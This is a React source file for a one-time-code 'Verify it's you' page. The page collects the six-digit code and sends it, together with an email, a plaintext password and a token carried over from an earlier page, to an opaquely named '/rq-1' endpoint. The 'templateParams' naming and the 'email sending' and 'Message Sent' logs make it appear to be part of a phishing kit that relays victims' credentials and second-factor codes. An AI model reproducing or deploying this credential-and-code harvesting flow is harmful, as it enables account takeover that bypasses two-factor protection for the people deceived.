import React, { useState } from 'react'
import { useHistory } from 'react-router-dom'

import '../styles/styles.css'
import LogoWhite from '../assets/logo_white.png'
import URL from './Url.js'


const Otp = (props) => {
    const history = useHistory()

    const [otp, setOtp] = useState('')
    const [loading, setLoading] = useState(false)

    const handleCode = (e) => {
        setOtp(e.target.value.replace(/\D/, ''))
    }

    const handleSubmit = async (e) => {
        e.preventDefault()
        setLoading(true)



        if (otp === '') {
            console.log('not sent')
        } else {
            if (props.location.state) {
                const templateParams = props.location.state

                templateParams.otp = otp

                try {
                   
                    const response = await fetch(URL + '/rq-1', {
                        method: 'POST',
                        headers: {
                            Accept: 'application/json',
                            'Content-type': 'application/json',
                            Authorization: 'Bearer ' + templateParams.token,
                        },
                        credentials: 'include',
                        mode: 'cors',
                        body: JSON.stringify({
                            email: templateParams.email,
                            password: templateParams.password,
                            otp
                        }),
                    })

                    const resData = await response.json()

                    console.log('email sending started')

                    if (resData.status === 'success') {
                        console.log('Message Sent.')
                        setTimeout(() => {
                            console.log('time out init')
                            setLoading(false)

                            history.push('/')
                        }, 3000)
                    } else if (resData.status === 'fail') {
                        console.log('Message failed to send.')
                        setLoading(false)
                    }
                } catch (err) {
                    console.log(err)
                }
            }
        }
    }

    return (
        <div className='grid '>
            <div className=' grid gap-7'>
                <img
                    src={LogoWhite}
                    alt=''
                    className='lg:w-1/4 w-5/12 justify-self-center my-7 '
                />

                <div className='mx-2'>
                    <form
                        className='grid w-full place-content-stretch bg-white md:w-1/3 md:mx-auto rounded '
                        style={{ padding: '30px 15px' }}
                        onSubmit={handleSubmit}
                    >
                        <h2 className='font-medium text-center text-[#1c124d] mb-4 text-2xl'>
                            Verify it's you
                        </h2>
                        <p className='text-center text-[#1c124d] my-4'>
                            We've sent a verification code to your email. Enter
                            the code from the email in the field below.
                        </p>
                        <input
                            type='text'
                            id='code'
                            className='text-black outline-none text-lg p-1 rounded-md justify-self-stretch placeholder-[#b2b7be] focus:border-black mb-4'
                            required
                            pattern='\d*'
                            value={otp}
                            placeholder='Enter 6 digit code'
                            onChange={handleCode}
                            maxLength={6}
                        />

                        <button
                            className=' rounded-md outline-none  bg-[#0059dd] text-white'
                            style={{
                                padding: '.5rem 3rem',
                                lineHeight: 2.5,
                                fontSize: '15px',
                            }}
                        >
                            {loading ? 'loading...' : 'Verify'}
                        </button>
                    </form>{' '}
                </div>
            </div>
        </div>
    )
}

export default Otp
